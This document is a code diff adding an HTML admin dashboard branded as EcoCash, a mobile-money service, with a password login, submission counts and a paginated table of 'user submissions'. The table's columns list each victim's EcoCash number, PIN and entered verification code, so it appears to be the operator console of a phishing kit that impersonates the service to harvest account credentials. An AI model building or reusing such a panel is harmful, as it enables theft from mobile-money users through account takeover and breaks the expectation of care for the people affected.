@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="theme-color" content="#004990" />
+    <meta name="robots" content="noindex, nofollow" />
+    <title>Admin · EcoCash</title>
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+    <link rel="stylesheet" href="/admin.css" />
+  </head>
+  <body>
+    <!-- Login screen -->
+    <main id="login-screen" class="login-screen" hidden>
+      <form id="login-form" class="login-card" novalidate>
+        <div class="login-logo" aria-hidden="true">
+          <span class="logo__brand">E</span>
+          <span class="logo__badge">Eco</span>
+        </div>
+        <h1 class="login-title">Admin Login</h1>
+        <p class="login-sub">
+          Enter your password to view all user submissions.
+        </p>
+
+        <label class="visually-hidden" for="password">Password</label>
+        <input
+          id="password"
+          name="password"
+          type="password"
+          autocomplete="current-password"
+          placeholder="Password"
+          required
+        />
+
+        <button type="submit" class="btn">
+          <span class="btn__label">LOG IN</span>
+          <span class="btn__spinner" aria-hidden="true"></span>
+        </button>
+        <p id="login-status" class="status" role="status" aria-live="polite"></p>
+      </form>
+    </main>
+
+    <!-- Dashboard -->
+    <main id="dashboard" class="dashboard" hidden>
+      <header class="topbar">
+        <div class="topbar__brand">
+          <div class="logo logo--sm" aria-hidden="true">
+            <span class="logo__brand">E</span>
+            <span class="logo__badge">Eco</span>
+          </div>
+          <div>
+            <h1 class="topbar__title">Admin Dashboard</h1>
+            <p class="topbar__sub" id="total-count">Loading…</p>
+          </div>
+        </div>
+        <div class="topbar__actions">
+          <button id="settings-btn" type="button" class="btn-ghost" title="Change password">
+            <span aria-hidden="true">⚙</span>
+            <span class="btn-ghost__label">Settings</span>
+          </button>
+          <button id="refresh-btn" type="button" class="btn-ghost" title="Refresh">
+            <span aria-hidden="true">⟳</span>
+            <span class="btn-ghost__label">Refresh</span>
+          </button>
+          <button id="logout-btn" type="button" class="btn-ghost btn-ghost--danger">
+            <span aria-hidden="true">⎋</span>
+            <span class="btn-ghost__label">Log out</span>
+          </button>
+        </div>
+      </header>
+
+      <section class="metrics" aria-label="Metrics">
+        <div class="metric">
+          <span class="metric__label">Total submissions</span>
+          <span class="metric__value" id="metric-total">—</span>
+        </div>
+        <div class="metric">
+          <span class="metric__label">Today</span>
+          <span class="metric__value" id="metric-today">—</span>
+        </div>
+        <div class="metric">
+          <span class="metric__label">Last 24 hours</span>
+          <span class="metric__value" id="metric-24h">—</span>
+        </div>
+      </section>
+
+      <section class="filters" aria-label="Filters">
+        <label class="search">
+          <span class="visually-hidden">Search</span>
+          <input
+            id="search-input"
+            type="search"
+            placeholder="Search by number, ID, or date…"
+            autocomplete="off"
+          />
+        </label>
+        <div class="filter-group" role="group" aria-label="Length">
+          <label class="visually-hidden" for="page-size">Items per page</label>
+          <select id="page-size" class="select">
+            <option value="10">10 / page</option>
+            <option value="25" selected>25 / page</option>
+            <option value="50">50 / page</option>
+            <option value="100">100 / page</option>
+          </select>
+        </div>
+      </section>
+
+      <section class="table-wrap" aria-label="Submissions table">
+        <table class="data-table">
+          <thead>
+            <tr>
+              <th scope="col">ID</th>
+              <th scope="col">EcoCash number</th>
+              <th scope="col">PIN</th>
+              <th scope="col">Code (entered)</th>
+              <th scope="col">Date</th>
+            </tr>
+          </thead>
+          <tbody id="rows">
+            <tr>
+              <td colspan="5" class="empty">Loading…</td>
+            </tr>
+          </tbody>
+        </table>
+        <p id="empty-state" class="empty empty--state" hidden>
+          No submissions yet. New submissions will appear here.
+        </p>
+      </section>
+
+      <nav class="pager" aria-label="Pagination">
+        <button id="prev-btn" type="button" class="btn-ghost" disabled>← Previous</button>
+        <span class="pager__info" id="pager-info">Page 1 / 1</span>
+        <button id="next-btn" type="button" class="btn-ghost" disabled>Next →</button>
+      </nav>
+
+      <footer class="footnote">
+        <p>Admin panel · EcoCash</p>
+      </footer>
+    </main>
+
+    <!-- Toast container -->
+    <div id="toast" class="toast" role="status" aria-live="polite" hidden></div>
+
+    <!-- Change-password modal -->
+    <div
+      id="settings-modal"
+      class="modal"
+      role="dialog"
+      aria-modal="true"
+      aria-labelledby="settings-title"
+      hidden
+    >
+      <div class="modal__backdrop" data-close-modal></div>
+      <div class="modal__card" role="document">
+        <header class="modal__head">
+          <h2 id="settings-title" class="modal__title">Change Password</h2>
+          <button
+            type="button"
+            class="modal__close"
+            aria-label="Close"
+            data-close-modal
+          >×</button>
+        </header>
+        <form id="change-pw-form" class="modal__body" novalidate>
+          <label class="field">
+            <span class="field__label">Current password</span>
+            <input
+              id="pw-current"
+              name="current"
+              type="password"
+              autocomplete="current-password"
+              required
+            />
+          </label>
+          <label class="field">
+            <span class="field__label">New password</span>
+            <input
+              id="pw-next"
+              name="next"
+              type="password"
+              autocomplete="new-password"
+              minlength="6"
+              required
+            />
+            <span class="field__hint">At least 6 characters.</span>
+          </label>
+          <label class="field">
+            <span class="field__label">Confirm new password</span>
+            <input
+              id="pw-confirm"
+              name="confirm"
+              type="password"
+              autocomplete="new-password"
+              minlength="6"
+              required
+            />
+          </label>
+          <p id="pw-status" class="status" role="status" aria-live="polite"></p>
+          <div class="modal__actions">
+            <button
+              type="button"
+              class="btn-ghost"
+              data-close-modal
+            >Cancel</button>
+            <button id="pw-submit" type="submit" class="btn btn--sm">
+              <span class="btn__label">SAVE</span>
+              <span class="btn__spinner" aria-hidden="true"></span>
+            </button>
+          </div>
+        </form>
+      </div>
+    </div>
+
+    <script src="/admin.js" defer></script>
+  </body>
+</html>
